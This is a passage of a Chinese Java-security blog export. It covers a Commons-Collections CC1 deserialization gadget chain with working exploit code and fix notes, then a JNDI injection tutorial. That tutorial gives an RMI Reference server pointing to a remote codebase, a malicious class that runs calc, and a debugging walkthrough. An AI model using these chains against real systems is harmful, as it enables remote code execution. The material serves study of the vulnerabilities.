class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; annotationInvocationHandlerDeclaredConstructor = annotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class);<br>        annotationInvocationHandlerDeclaredConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler)annotationInvocationHandlerDeclaredConstructor.newInstance(Target.class, lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;, invocationHandler);<br>        invocationHandler = (InvocationHandler)annotationInvocationHandlerDeclaredConstructor.newInstance(Target.class, proxyMap);<br>        serialize(invocationHandler);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        objectOutputStream.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> objectInputStream.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172113289.png" alt="image-20240817211309187"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">ObjectInputStream.readObject()</span><br><span class="hljs-comment">AnnotationInvocationHandler.readObject()</span><br><span class="hljs-comment">Map(Proxy).entrySet()</span><br><span class="hljs-comment">AnnotationInvocationHandler.invoke()</span><br><span class="hljs-comment">LazyMap.get()</span><br><span class="hljs-comment">ChainedTransformer.transform()</span><br><span class="hljs-comment">ConstantTransformer.transform()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Class.getMethod()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.getRuntime()</span><br><span class="hljs-comment">InvokerTransformer.transform()</span><br><span class="hljs-comment">Method.invoke()</span><br><span class="hljs-comment">Runtime.exec()</span><br><span class="hljs-comment">Requires:</span><br><span class="hljs-comment">commons-collections</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><h1 id="四、修复方式"><a href="#四、修复方式" class="headerlink" title="四、修复方式"></a>四、修复方式</h1><p>参考链接：<a href="https://drun1baby.top/2022/06/10/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96Commons-Collections%E7%AF%8702-CC1%E9%93%BE%E8%A1%A5%E5%85%85/">Java 反序列化 Commons-Collections 篇 02-CC1 链补充</a></p><h2 id="4-1-TransformerMap-版的-CC1-链子"><a href="#4-1-TransformerMap-版的-CC1-链子" class="headerlink" title="4.1 TransformerMap 版的 CC1 链子"></a>4.1 TransformerMap 版的 CC1 链子</h2><p>对于 TransformerMap 版的 CC1 链子来说，jdk8u71 及以后的版本没有了能调用 ReadObject 中 <code>setValue()</code> 方法的地方。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172116572.png" alt="img"></p><h2 id="4-2-对于正版-CC1-链子"><a href="#4-2-对于正版-CC1-链子" class="headerlink" title="4.2 对于正版 CC1 链子"></a>4.2 对于正版 CC1 链子</h2><p>因为在8u71之后的版本反序列化不再通过<code>defaultReadObject</code>方式，而是通过<code>readFields</code> 来获取几个特定的属性，<code>defaultReadObject</code> 可以恢复对象本身的类属性，比如<code>this.memberValues</code> 就能恢复成我们原本设置的恶意类，但通过<code>readFields</code>方式，<code>this.memberValues</code> 就为null，所以后续执行get()就必然没发触发，这也就是高版本不能使用的原因</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202408172117354.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>Java安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java安全</tag>
      
      <tag>反序列化</tag>
      
      <tag>Java反射</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化之jndi注入</title>
    <link href="/2024/08/13/jndi%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/08/13/jndi%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>因为 jndi 的内容比较多，我们从官方文档去看，专挑和安全有关系的地方看。</p><p>官方文档地址：<a href="https://docs.oracle.com/javase/tutorial/jndi/overview/index.html">https://docs.oracle.com/javase/tutorial/jndi/overview/index.html</a></p><h1 id="一、jndi基本介绍"><a href="#一、jndi基本介绍" class="headerlink" title="一、jndi基本介绍"></a>一、jndi基本介绍</h1><ol><li>什么是jndi？它的作用是什么？</li></ol><p>根据官方文档，JNDI 全称为 <strong>Java Naming and Directory Interface</strong>，即 Java 名称与目录接口。也就是一个名字对应一个 Java 对象。也可以说是一个字符串对应的java对象；</p><p>jndi 在 jdk 里面支持以下四种服务：</p><ol><li>LDAP：轻量级目录访问协议</li><li>通用对象请求代理架构(CORBA)；通用对象服务(COS)名称服务；</li><li>Java远程方法调用(RMI)注册表</li><li>DNS服务</li></ol><p>前三种都是字符串对应对象，DNS服务是IP对应域名；</p><h2 id="1-1-jndi的代码以及包说明"><a href="#1-1-jndi的代码以及包说明" class="headerlink" title="1.1 jndi的代码以及包说明"></a>1.1 jndi的代码以及包说明</h2><p>jndi主要是上述四种服务，对应四个包加一个主包；</p><p>jndi接口主要分为下面5个包：</p><ul><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/naming.html">javax.naming</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/directory.html">javax.naming.directory</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/event.html">javax.naming.event</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/ldap.html">javax.naming.ldap</a></li><li><a href="https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/provider.html">javax.naming.spi</a></li></ul><p>其中最重要的是javax.naming包，包含了访问目录服务所需的类和接口，比如 Context、Bindings、References、lookup 等。 以上述打印机服务为例，通过 jndi 接口，用户可以透明地调用远程打印服务，伪代码如下所示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Context</span> <span class="hljs-variable">ctx</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);<br><span class="hljs-type">Printer</span> <span class="hljs-variable">printer</span> <span class="hljs-operator">=</span> (Printer)ctx.lookup(<span class="hljs-string">&quot;myprinter&quot;</span>);<br>printer.print(report);<br></code></pre></td></tr></table></figure><p>Jndi 在对不同服务进行调用的时候，会去调用 xxxContext 这个类，比如调用 RMI 服务的时候就是调的 RegistryContext，这一点是很重要的，记住了这一点对于 JNDI 这里的漏洞理解非常有益。</p><p>一般的应用也就是先 <code>new InitialContext()</code>，再调用 API 即可，下面我们先看一个 JNDI 结合 RMI 的代码实例。</p><h2 id="1-2-jndi注入限制条件"><a href="#1-2-jndi注入限制条件" class="headerlink" title="1.2 jndi注入限制条件"></a>1.2 jndi注入限制条件</h2><table><thead><tr><th><strong>协议</strong></th><th><strong>JDK6</strong></th><th><strong>JDK7</strong></th><th><strong>JDK8</strong></th><th><strong>JDK11</strong></th></tr></thead><tbody><tr><td>LADP</td><td>6u211以下</td><td>7u201以下</td><td>8u191以下</td><td>11.0.1以下</td></tr><tr><td>RMI</td><td>6u132以下</td><td>7u122以下</td><td>8u113以下</td><td>无</td></tr></tbody></table><h1 id="二、jndi的利用方式，代码以及一些漏洞"><a href="#二、jndi的利用方式，代码以及一些漏洞" class="headerlink" title="二、jndi的利用方式，代码以及一些漏洞"></a>二、jndi的利用方式，代码以及一些漏洞</h1><h2 id="2-1-jndi结合RMI"><a href="#2-1-jndi结合RMI" class="headerlink" title="2.1 jndi结合RMI"></a>2.1 jndi结合RMI</h2><p>新建两个模块，分别放置服务端和客户端，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiRmiServer</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>        initialContext.rebind(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JndiRmiClient</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();<br>        <span class="hljs-type">RemoteObj</span> <span class="hljs-variable">remoteObj</span> <span class="hljs-operator">=</span> (RemoteObj)initialContext.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1/remoteObj&quot;</span>);<br>        System.out.println(remoteObj.sayHello(<span class="hljs-string">&quot;hello&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-1-1-RMI原生漏洞"><a href="#2-1-1-RMI原生漏洞" class="headerlink" title="2.1.1 RMI原生漏洞"></a>2.1.1 RMI原生漏洞</h3><p>这里的 api 虽然是 JNDI 的服务的，但是实际上确实调用到 RMI 的库里面的，这里我们先打断点调试一下，证明 jndi 的 api 实际上是调用了 RMI 的库里原生的 <code>lookup()</code> 方法。</p><p>断点的话，下一个在 <code>InitialContext.java</code> 的 <code>lookup()</code> 方法这里即可，开始调试。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833824.png"></p><p>进到 <code>lookup()</code> 方法里面进去，这里 <code>GenericURLContext</code> 类的 <code>lookup()</code> 方法里面又套了一个 <code>lookup()</code> 方法，我们继续进去。</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833661.png"></p><p>进去之后发现这个类是 <code>RegistryContext</code>，也就是 RMI 对应 <code>lookup()</code> 方法的类，至此，可以基本说明<strong>JNDI 调用 RMI 服务的时候，虽然 API 是 JNDI 的，但是还是去调用了原生的 RMI 服务。</strong></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833710.png"></p><p>所以说，如果 JNDI 这里是和 RMI 结合起来使用的话，RMI 中存在的漏洞，JNDI 这里也会有。但这并不是 JNDI 的传统意义上的漏洞。</p><h3 id="2-1-2-引用的漏洞（Normal-Jndi）"><a href="#2-1-2-引用的漏洞（Normal-Jndi）" class="headerlink" title="2.1.2 引用的漏洞（Normal Jndi）"></a>2.1.2 引用的漏洞（Normal Jndi）</h3><blockquote><p>这个漏洞被称作 Jndi 注入漏洞，它与所调用服务无关，不论你是 RMI，DNS，LDAP 或者是其他的，都会存在这个问题。</p></blockquote><p>原理是在服务端调用了一个 <code>Reference</code> 对象，我个人的理解，它是很像代理的。</p><p>Reference对象创建的时候的三个参数的意义：</p><ul><li><code>**String className**</code>：表示要创建的资源的完全限定类名。用于在查找时确定具体的资源类型。</li><li><code>**StringFactory**</code>（可选）：指定一个 <code>ObjectFactory</code> 的类名，用于在查找时创建实际的对象实例。若不指定，JNDI 会尝试默认构造。</li><li><code>**StringRefAddr[]**</code>：通过 <code>StringRefAddr</code> 对象传递属性，通常用于定义资源的配置，比如数据库连接的 URL、用户名和密码等。每个 <code>StringRefAddr</code> 包含一个名称和值，用于描述具体的配置项。</li></ul><p>代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.InitialContext;  <br><span class="hljs-keyword">import</span> javax.naming.Reference;  <br><span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;  <br><span class="hljs-keyword">import</span> java.rmi.registry.Registry;  <br>  <br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JNDIRMIServer</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>         <span class="hljs-type">InitialContext</span> <span class="hljs-variable">initialContext</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();  <br>         <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);  <br>         <span class="hljs-comment">// RMI的JNDI注入漏洞</span><br>         <span class="hljs-comment">// initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;, new RemoteObjImpl()); // JNDI 注入漏洞  </span><br>         <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;Calc&quot;</span>,<span class="hljs-string">&quot;http://localhost:7777/&quot;</span>);  <br>         initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, reference);  <br>        &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>我们看到这个地方，原本我们是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">initialContext.rebind(<span class="hljs-string">&quot;rmi://localhost:1099/remoteObj&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">RemoteObjImpl</span>());<br></code></pre></td></tr></table></figure><p>直接是绑定了一个对象，而在 jndi 里面，我们可以通过 new 一个 Reference 类的方法来解决。然后再 rebind 调用它，这个思路有点像代理吧，然后调用它这个很像 URLClassLoader。有兴趣的师傅可以跟一下断点。</p><p>如果要攻击的话，也很简单，我们在 URLClassLoader 这个获取的方法里面添加恶意类就可以了，比如我这里是 Calc.exe 这个恶意命令调用，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Calc</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Calc</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);  <br>    &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>然后通过python起服务器运行启动即可；</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python -m http.server 7777<br></code></pre></td></tr></table></figure><p>如果是使用上述代码进行程序运行，是一定会报错的，因为服务端这里还是调用sayHello()，但是我们实际上查找到的是远程的Calc.class，Calc.class类上是没有sayHello这个方法的，因为导致无法调用sayHello报错；</p><ul><li>开始调试，查找漏洞点；断点依旧打在lookup()这个地方一步一步查找；</li></ul><p>我们的目的是为了了解漏洞出发的原因，恶意类是如何出发的，怎么调用构造函数使得命令执行的？</p><p>跟进几个 <code>lookup()</code> 方法，直到去到 RMI 的原生的 <code>lookup()</code>，对应的类我也在前文提及过了，是 <code>RegistryContext</code></p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833546.png"></p><p>在<code>RegistryContext</code>类中的var2变量对应的是从远程类中获取的到的obj变量，把Ref的值赋给了它。obj是一个<code>ReferenceWrapper_Stub</code>类的变量，因为这是一个Reference。</p><p>接着跟进<code>decodeObject()</code>方法，查看方法的实现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833898.png"></p><p>先做了一个简单的判断，首先判断var1是否为 <code>ReferenceWrapper</code>，也就是判断是否为 <code>Reference</code> 对象；往下是一个比较重要的方法 <code>getObjectInstance()</code>，从名字上推测这应该是一个初始化的方法。跟进<code>getObjectInstance()</code>查看实现；</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object<br>        <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object refInfo, Name name, Context nameCtx,</span><br><span class="hljs-params">                          Hashtable&lt;?,?&gt; environment)</span><br>        <span class="hljs-keyword">throws</span> Exception<br>    &#123;<br><br>        ObjectFactory factory;<br><br>        <span class="hljs-comment">// Use builder if installed</span><br>        <span class="hljs-type">ObjectFactoryBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> getObjectFactoryBuilder();<br>        <span class="hljs-keyword">if</span> (builder != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-comment">// builder must return non-null factory</span><br>            factory = builder.createObjectFactory(refInfo, environment);<br>            <span class="hljs-keyword">return</span> factory.getObjectInstance(refInfo, name, nameCtx,<br>                environment);<br>        &#125;<br><br>        <span class="hljs-comment">// Use reference if possible</span><br>        <span class="hljs-type">Reference</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Reference) &#123;<br>            ref = (Reference) refInfo;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (refInfo <span class="hljs-keyword">instanceof</span> Referenceable) &#123;<br>            ref = ((Referenceable)(refInfo)).getReference();<br>        &#125;<br><br>        Object answer;<br><br>        <span class="hljs-keyword">if</span> (ref != <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> ref.getFactoryClassName();<br>            <span class="hljs-keyword">if</span> (f != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-comment">// if reference identifies a factory, use exclusively</span><br><br>                factory = getObjectFactoryFromReference(ref, f);<br>                <span class="hljs-keyword">if</span> (factory != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> factory.getObjectInstance(ref, name, nameCtx,<br>                                                     environment);<br>                &#125;<br>                <span class="hljs-comment">// No factory found, so return original refInfo.</span><br>                <span class="hljs-comment">// Will reach this point if factory class is not in</span><br>                <span class="hljs-comment">// class path and reference does not contain a URL for it</span><br>                <span class="hljs-keyword">return</span> refInfo;<br><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// if reference has no factory, check for addresses</span><br>                <span class="hljs-comment">// containing URLs</span><br><br>                answer = processURLAddrs(ref, name, nameCtx, environment);<br>                <span class="hljs-keyword">if</span> (answer != <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">return</span> answer;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">// try using any specified factories</span><br>        answer =<br>            createObjectFromFactories(refInfo, name, nameCtx, environment);<br>        <span class="hljs-keyword">return</span> (answer != <span class="hljs-literal">null</span>) ? answer : refInfo;<br>    &#125;<br></code></pre></td></tr></table></figure><p>在这个方法中，首先进行了<code>builder</code>的判断，但是我们并没有使用过想用功能，简单看看就行，应该没用到；</p><p>继续往下看到关于reference的，将传入的<code>refInfo</code>强转为<code>Reference</code>。继续向下看……</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833404.png"></p><p>在这里我们看到了关于查找<code>Factory</code>的地方，如果ref中存在factory的定义，则直接通过调用<code>getObjectInstance</code>方法获取对象实例返回；那么，我们现在继续跟进方法的实现；</p><p><img src="https://cdn.jsdelivr.net/gh/candyb0x/PicgoBed@main/typoraImg/202412071833296.png"></p><p><code>getObjectFactoryFromReference()</code> 这个方法中，我们已经获取到了这个恶意类，接着执行加载类的 <code>loadClass()</code> 方法。</p><p>继续往下走，获取到 codebase，并且进行 helper.loadClass()，这里就是我们前面讲到的动态加载类的一个方法 ———— URLClassLoader</p><p>最后在 newInstance() 这一步执行代码。</p><h3 id="2-1-3-总结"><a href="#2-1-3-总结" class="headerlink" title="2.1.3 总结"></a>2.1.3 总结</h3><p>总结一下还是比较简单的，就是 URLClassLoader 的动态类加载，但是讲道理，这个地方是 Jndi 专属的，不是因为 RMI 的问题。</p><p>然后攻击点的话，就是因为客户端进行了 <code>lookup()</code> 方法的调用。因此这也是服务器攻击客户端的方法。</p><p>这个漏洞在 jdk8u121 当中被修复，也就是 <code>lookup()</code> 方法只可以对本地进行 <code>lookup()</code> 方法的调用。</p><h2 id="2-2-Jndi结合ldap"><a href="#2-2-Jndi结合ldap" class="headerlink" title="2.2 Jndi结合ldap"></a>2.2 Jndi结合ldap</h2><h3 id="2-2-1-ldap介绍"><a href="#2-2-1-ldap介绍" class="headerlink" title="2.2.1 ldap介绍"></a>2.2.1 ldap介绍</h3><p>ldap 是一种协议，并不是 Java 独有的</p><p>LDAP 既是一类服务，也是一种协议，定义在 <a href="http://www.ietf.org/rfc/rfc2251.txt">RFC2251</a>(<a href="https://datatracker.ietf.org/doc/rfc4511/">RFC4511</a>) 中，是早期 X.500 DAP (目录访问协议) 的一个子集，因此有时也被称为 <strong>X.500-lite</strong>。</p><p>LDAP Directory 作为一种目录服务，主要用于带有条件限制的对象查询和搜索。目录服务作为一种特殊的数据库，用来保存描述性的、基于属性的详细信息。和传统数据库相比，最大的不同在于目录服务中数据的组织方式，它是一种有层次的树形结构，因此它有优异的读性能，但写性能较差，并且没有事务处理、回滚等复杂功能，不适于存储修改频繁的数据。</p><p>LDAP 的请求和响应是 <strong>ASN.1</strong> 格式，使用二进制的 BER 编码，操作类型(Operation)包括 Bind&#x2F;Unbind、Search、Modify、Add、Delete、Compare 等等，除了这些常规的增删改查操作，同时也包含一些拓展的操作类型和异步通知事件。</p><h3 id="2-2-2-ldap的JNDI漏洞"><a href="#2-2-2-ldap的JNDI漏洞" class="headerlink" title="2.2.2 ldap的JNDI漏洞"></a>2.2.2 ldap的JNDI漏洞</h3><p>先起一个 LDAP 的服务，这里需要先在 pom.xml 中导入 <code>unboundid-ldapsdk</code> 的依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>com.unboundid<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>unboundid-ldapsdk<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.2.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>  <br>  <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span>  <br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><p>编写ldap服务端的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 